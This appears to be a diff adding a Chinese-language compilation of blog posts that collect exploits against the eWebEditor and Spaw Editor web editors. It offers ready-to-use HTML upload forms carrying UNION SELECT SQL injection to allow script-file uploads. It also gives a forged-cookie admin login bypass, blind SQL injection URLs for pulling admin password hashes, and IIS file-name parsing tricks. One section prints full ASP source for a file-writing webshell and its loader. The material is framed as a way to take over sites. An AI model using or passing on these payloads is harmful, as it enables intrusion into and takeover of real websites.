@@ -1,0 +1,396 @@
+
+
+
+1.ewebeditor 2.16版突破上传目录无脚本执行权限exp
+
+2.ewebeditor 1.00版-2.16版upload.asp注入漏洞控制上传文件exp，突破无脚本执行权限
+
+3.ewebeditor可以上传asp、asa文件，但无上传按钮工具栏
+
+4.ewebeditor 2.7.5 上传漏洞
+
+5.ewebeditor 2.1.6 asp版用union select控制上传拿webshell
+
+6.ewebeditor asp版 1.0.0 上传漏洞利用程序
+
+7.ewebeditor绕过后台登陆漏洞（通杀低版本）
+
+8.Spaw Editor v1.0至2.0远程文件上传漏洞
+
+9.ewebeditor远程上传执行代码漏洞
+
+10.eWebEditorNet 漏洞（aspx版漏洞）
+
+11.ewebeditor asp版5.5-6.X解析漏洞0day
+
+12.ewebeditor某些版本upload.asp文件注入漏洞
+
+13.ewebeditor v2.7版以前所有版本注入漏洞 
+
+14.ewebeditor 4.6精简版上传漏洞
+
+
+
+如何查看ewebeditor的版本
+
+直接点开下面链接
+
+ewebeditor编辑器查看版本信息
+
+edit/dialog/about.html
+
+ewebeditor/dialog/about.html
+
+eweb/dialog/about.html
+
+ewebedit/dialog/about.html
+
+ewindoweditor/dialog/about.html
+
+去后缀L
+
+同理
+
+edit/ewebeditor.asp
+
+给他赋上参数
+像这样edit/ewebeditor?id=1
+
+调出上传界面，点感叹号，或者下载数据库查看版本
+
+
+
+1.http://www.chouwazi.com/ewebeditor.asp?id=NewsContent&style=s_full  
+出现编辑器框，有远程上传，点感叹号！查看ewebeditor编辑器版本！
+
+
+
+-----------------------------------------------------
+ewebeditor 2.16版突破上传目录无脚本执行权限exp
+
+
+如果uploadfile目录取消脚本执行，不能执行脚本文件，
+
+或者uploadfile目录没有写入权限，无法写入文件！
+
+用这个exp吧， 把小马传到db/目录了，其他的自行变通......
+
+1.<form action="http://www.chouwazi.com/ewebeditor/upload.asp?action=save&type=IMAGE&style=luoye' union select S_ID,S_Name,S_Dir,S_CSS,[S_UploadDir]%2b'/../db',S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%2b'|asa',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl from ewebeditor_style where s_name='standard'and'a'='a" method=post name=myform enctype="multipart/form-data">  
+2.<input type=file name=uploadfile size=100><br><br>  
+3.<input type=submit value=Fuck>  
+4.</form>  
+ 
+
+备用
+
+1.<form action="http://site/manage/ewebeditor/upload.asp?action=save&type=IMAGE&style=luoye' union select S_ID,S_Name,S_Dir,S_CSS,[S_UploadDir]%2b'/../db',S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%2b'|asa',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl from ewebeditor_style where s_name='standard'and'a'='a" method=post name=myform enctype="multipart/form-data">  
+2.<input type=file name=uploadfile size=100><br><br>  
+3.<input type=submit value=Fuck>  
+4.</form>   
+
+-----------------------------------------------------------
+
+
+ewebeditor 1.00版-2.16版upload.asp注入漏洞控制上传文件exp，突破无脚本执行权限
+
+2.1.6 以前版本的用此 exp
+1.<H1>ewebeditor asp版 1.0.0 上传漏洞利用程序----By HCocoa</H1><br><br>  
+2.<form action="http://chouwazi.com/ewebeditor/upload.asp?action=save&type=IMAGE&style=hcocoa' union select S_ID,S_Name,S_Dir,S_EditorHeader,S_Body,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%2b'|cer|aspx',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord from ewebeditor_style where s_name='standard'and'a'='a" method=post name=myform enctype="multipart/form-data">  
+3.<input type=file name=uploadfile size=100><br><br>  
+4.<input type=submit value=Fuck>  
+5.</form>  
+ 
+
+如果上传目录无脚本执行权限，可以更换目录，用这个exp.... /db 可以自定义，不过要绝对路径！
+
+例如下：
+
+XML/HTML代码
+1.<form action="http://www.chouwazi.com/upload.asp?action=save&type=IMAGE&style=horind' union select S_ID,S_Name,S_Dir,S_CSS,[S_UploadDir]%2b'/../db',S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%2b'|asa',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl from ewebeditor_style where s_name='standard'and'a'='a" method=post name=myform enctype="multipart/form-data">       
+2.<input type=file name=uploadfile size=100><br><br>       
+3.<input type=submit value=Fuck>       
+4.</form>  
+
+-----------------------------------------------
+
+ewebeditor可以上传asp、asa文件，但无上传按钮工具栏
+作者:chouwaziadmin 日期:2012-01-28 00:58:25字体大小: 小 中 大 
+此exp用在
+
+数据库中有asp、asa、cer扩展样式，但是无上传按钮和不能添加工具栏、数据库为只读等
+
+用此exp解决拿webshell
+
+1.<form action="http://chouwazi.com/ewebeditor/upload.asp?action=save&type=&style=可以上传asa的样式名" method=post name=myform enctype="multipart/form-data">  
+2.<input type=file name=uploadfile size=1 style="width:100%">  
+3.<input type=submit value="上传了"></input>  
+4.</form>  
+
+-------------------------------------------------
+
+ewebeditor 2.7.5 上传漏洞
+作者:chouwaziadmin 日期:2012-01-28 00:55:15字体大小: 小 中 大 
+ewebeditor 2.7.5 上传漏洞
+
+至于是vip版，还是普通版本，不知晓，等用的时候再看！
+
+1.<form action="http://chouwazi.com/ewebedit/upload.asp?action=save&type=&style=可以上传asa的样式名" method=post name=myform enctype="multipart/form-data">  
+2.<input type=file name=uploadfile size=1 style="width:100%">  
+3.<input type=submit value="上传了"></input>  
+4.</form>  
+
+
+------------------------------
+
+ewebeditor 2.1.6 asp版用union select控制上传拿webshell
+作者:chouwaziadmin 日期:2012-01-28 00:51:14字体大小: 小 中 大 
+eWebEditor 2.1.6 asp版upload.asp注入漏洞，用union select控制上传扩展拿webshell
+
+可以上传cer和asa，自行修改！
+
+ 
+
+原版
+1.<H1>eWebEditor 2.1.6 asp版 上传漏洞利用程序----</H1><br><br>  
+2.<form action="http://www.chouwazi.com/admin/ewebeditor/upload.asp?action=save&type=IMAGE&style=luoye' union select S_ID,S_Name,S_Dir,S_CSS,S_UploadDir,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%2b'|asa',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl from ewebeditor_style where s_name='standard'and'a'='a" method=post name=myform enctype="multipart/form-data">  
+3.<input type=file name=uploadfile size=100><br><br>  
+4.<input type=submit value=Fuck>  
+5.</form>  
+ 
+
+2.1.6 的直接用此 exp，这个是冰的原点写的
+1.<HTML><HEAD><TITLE>ewebeditor的upload文件上传exp</TITLE><meta http-equiv="Content-Type" content="text/html; charset=gb2312"> </head><body bgcolor=orange>   
+2.<tr>不是通杀，版本有区别！我就郁闷，落叶那JJ说文章没说清楚，这份EXP就是根据文章写出来的！落叶那家伙的EXP我看半天没看明白有啥区别！<br></tr>  
+3.<tr>文件传到了uploadfile目录下了</tr><br>  
+4.<tr>不知道算不算0day，我是冰的原点</tr><br>  
+5.<tr>至于利用方法就是修改源文件中的action，然后传cer的马马就行了！</tr><br>  
+6.<form action="http://chouwazi.com/ewebeditor/upload.asp?action=save&type=IMAGE&style=firefox'%20union%20select%20S_ID,S_Name,S_Dir,S_CSS,S_UploadDir,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt,%20[S_ImageExt]%2b'|cer',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl%20from%20ewebeditor_style%20where%20s_name='standard'%20and%20'a'='a" method=post name=myform enctype="multipart/form-data"><input type=file name=uploadfile size=100 style="width:100%"><input type=submit value=传吧></form>  
+不是通杀，版本有区别！如果下到数据库可以根据数据库进行修改！
+
+-----------------------------------------
+
+
+ewebeditor asp版 1.0.0 上传漏洞利用程序
+作者:chouwaziadmin 日期:2012-01-28 00:35:25字体大小: 小 中 大 
+ewebeditor 1.0.0 上传漏洞：这个是HCocoa仿照luoye的exp写的
+
+
+ewebeditor 1.0.0版基本已经灭绝
+
+1.<H1>ewebeditor asp版 1.0.0 上传漏洞利用程序----By HCocoa</H1><br><br>  
+2.<form action="http://chouwazi.com/ewebeditor/upload.asp?action=save&type=IMAGE&style=hcocoa' union select S_ID,S_Name,S_Dir,S_EditorHeader,S_Body,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%2b'|cer|aspx',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord from ewebeditor_style where s_name='standard'and'a'='a" method=post name=myform enctype="multipart/form-data">  
+3.<input type=file name=uploadfile size=100><br><br>  
+4.<input type=submit value=Fuck>  
+5.</form> 
+
+-----------------------------------------
+
+ewebeditor绕过后台登陆漏洞（通杀低版本）
+作者:chouwaziadmin 日期:2012-01-25 04:18:38字体大小: 小 中 大 
+影响版本：ewebeditor低版本影响广泛，具体不详
+
+测试版本：ewebeditor php3.8版    ewebeditor asp2.8版
+
+转载地址：http://www.chouwazi.com/article.asp?id=313
+
+利用描述：
+
+一：例如ewebeditor php3.8版
+
+首先找到后台登陆界面，默认后台是http://www.chouwazi.com/eWebEditor/admin/login.php
+
+在后台随便输入一个用户和密码，会提示出错了。
+
+这时清空浏览器的url,然后输入以下内容后三次回车：
+
+1.javascript:alert(document.cookie=”adminuser=”+escape(”admin”));javascript:alert(document.cookie=”adminpass=”+escape(”admin”));javascript:alert(document.cookie=”admindj=”+escape(”1”));  
+然后访问文件http://www.chouwazi.com/ewebeditor/admin/default.php就可以直接进入后台了
+
+ 
+
+二：  ewebeditor asp2.8版
+
+利用方法和ewebeditor php3.8版一样，其他的自行测试
+
+--------------------------------------------
+
+Spaw Editor v1.0至2.0远程文件上传漏洞
+作者:chouwaziadmin 日期:2012-01-25 03:56:57字体大小: 小 中 大 
+发布日期：2010-05.21
+发布作者：Ma3sTr0-Dz
+影响版本：paw Editor v1.0 & 2.0
+漏洞描述：paw Editor编辑器存在远程文件上传漏洞
+
+ 
+
+Exploit :
+
+For Windows & ASP Sites : 
+
+
+1.http://www.chouwazi.com/spaw2/dialogs/dialog.aspx?module=spawfm&dialog=spawfm&theme=spaw2&lang=en&charset=utf-8&scid=2d0650b7920a4fbf87598f8d58b4a99b&type=images  
+上传文件地址http://www.chouwazi.com/spaw2/uploads/files/sec4ever.asp;.jpg
+
+ 
+
+For Linux PHP :
+
+1.http://www.chouwazi.com/spaw2/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2&lang=en&charset=utf-8&scid=2d0650b7920a4fbf87598f8d58b4a99b&type=files  
+上传文件地址http://www.chouwazi.com/spaw2/uploads/files/sec4ever.jpg.php
+
+------------------------------------------
+
+ewebeditor远程上传执行代码漏洞
+作者:chouwaziadmin 日期:2012-01-25 03:45:15字体大小: 小 中 大 
+漏洞描述：ewebeditor 编辑器远程上传文件时执行代码，导致getwebshell漏洞
+
+影响版本：ewebeditor 2.8版以后
+
+发布日期：2010-03-22
+
+转载地址：http://www.chouwazi.com/article.asp?id=311
+
+利用描述：
+
+1.把xiaoma.jpg.asp和xiaoma.asp两个文件放在同一目录下
+
+xiaoma.jpg.asp代码
+1.<%    
+2.Set fs = CreateObject("Scripting.FileSystemObject")    
+3.Set MyTextStream=fs.OpenTextFile(server.MapPath("\xiaoma.asp"),1,false,0)    
+4.Thetext=MyTextStream.ReadAll    
+5.response.write thetext    
+6.%>   
+www.chouwazi.com
+
+xiaoma.asp代码
+1.<%on error resume next%>   
+2.<%ofso="scripting.filesystemobject"%>   
+3.<%set fso=server.createobject(ofso)%>   
+4.<%path=request("path")%>   
+5.<%if path<>"" then%>   
+6.<%data=request("dama")%>   
+7.<%set dama=fso.createtextfile(path,true)%>   
+8.<%dama.write data%>   
+9.<%if err=0 then%>   
+10.<%="success"%>   
+11.<%else%>   
+12.<%="false"%>   
+13.<%end if%>   
+14.<%err.clear%>   
+15.<%end if%>   
+16.<%dama.close%>   
+17.<%set dama=nothing%>   
+18.<%set fos=nothing%>   
+19.<%="<form action='' method=post>"%>   
+20.<%="<input type=text name=path>"%>   
+21.<%="<br>"%>   
+22.<%=server.mappath(request.servervariables("script_name"))%>   
+23.<%="<br>"%>   
+24.<%=""%>   
+25.<%="<textarea name=dama cols=50 rows=10 width=30></textarea>"%>   
+26.<%="<br>"%>   
+27.<%="<input type=submit value=save>"%>   
+28.<%="</form>"%>   
+2.然后远程上传xiaoma.jpg.asp，在远程上传xiaoma.jpg.asp的过程中会执行其中的代码
+
+自动上传xiaoma.asp，导致拿到webshell，其中参数自行修改！
+
+
+--------------------------------
+
+eWebEditorNet 漏洞（aspx版漏洞）
+
+总结:
+1
+javascript:lbtnUpload.click(); 主语言为javascrypt,向当前页面的lbtnUpload发送一个单击事件
+
+实际上就相当于点了提交按钮
+2
+脚本限制了ASPX后缀的文件,再地址栏后加了一个空格(加别的符号也行,例如 ' ),
+
+脚本获取到的文件名就为'aspx ',所以if xxx ='aspx' then 这类型的判断语句就不行
+
+http://www.chouwazi.com/article.asp?id=307
+
+--------------------------------
+
+ewebeditor asp版5.5-6.X解析漏洞0day
+作者:chouwaziadmin 日期:2012-01-21 00:36:49字体大小: 小 中 大 
+影响版本：ewebeditor5.5版，对6.X以上版本也管用，对ASP。aspx。JSP。均管用。
+
+转载地址：http://www.chouwazi.com/article.asp?id=301
+
+ewebeditor5.5版没有mdb数据库，账号和密码存在配置文件
+
+漏洞描述：利用IIS的解析漏洞建立一个XX.asp的文件夹，上传jpg拿webshell
+
+1.http://www.chouwazi.com/ewebeditor/asp/upload.asp?action=save&type=image&style=popup&cusdir=a.asp  
+可以建立一个a.asp文件夹
+
+ 
+
+或者直接用html上传
+
+1.<form action="http://www.XXX.com/ewebeditor/asp/upload.asp?action=save&type=image&style=popup&cusdir=a.asp" method=post name=myform enctype="multipart/form-data">  
+2.<input type=file name=uploadfile size=100><br><br>  
+3.<input type=submit value=upload>  
+4.</form>  
+
+
+------------------------------------
+
+ewebeditor某些版本upload.asp文件注入漏洞
+作者:chouwaziadmin 日期:2012-01-20 01:37:53字体大小: 小 中 大 
+影响版本：不确定
+
+转载地址：http://www.chouwazi.com/article.asp?id=298
+
+某些些版本的ewebeditor编辑器的upload.asp文件存在注入漏洞！
+
+信息错误则返回脚本出错的提示，在浏览器左下角！
+
+具体利用如下:
+
+1.http://www.chouwazi.com/ewebeditor/Upload.asp?type=FILEstyle=standard_coolblue1'and%20(select%20top%201%20asc(mid(sys_userpass,15,1))%20from%20ewebeditor_system%20)>98%20and%20'1'='1  
+注意修改红色部分的字段名、位数、ascii码的值！
+
+*************************************
+
+ewebeditor v2.7版以前所有版本注入漏洞 
+作者:chouwaziadmin 日期:2012-01-20 01:12:57字体大小: 小 中 大 
+影响版本：ewebeditor v2.7版以前所有版本
+
+转载地址：http://www.chouwazi.com/article.asp?id=297
+
+目前网上流传太多ewebeidtor的修改版、lite版本.....
+
+ewebedior 2.7以前版本全部存在注入漏洞，直接检测是不行的，要写入特征字符
+
+ 
+
+ewebeditor数据库默认管理员表是：ewebeditor_system
+
+列是:sys_UserName和sys_userpass
+
+目前发现pangolin和NBSI可注入猜解，啊D只能发现注入不能猜解，其他的自行测试!
+
+注入链接：
+
+1.http://www.chouwazi.com/ewebeditor2007/ewebeditor.asp?id=article_content&style=full_v200  
+ 
+
+其他版本注入测试：
+
+1.http://www.chouwazi.com/ewebeditor/ewebeditor.asp?id=contentid&style=standard  
+
+----------------------------------------
+
+ewebeditor 4.6精简版上传漏洞
+作者:chouwaziadmin 日期:2012-01-17 20:03:00字体大小: 小 中 大 
+影响版本：ewebeditor 4.6精简版
+
+漏洞利用：利用iis6解析漏洞拿webshell
+
+直接上传 1.asa;1.jpg
+----------------------------------------------
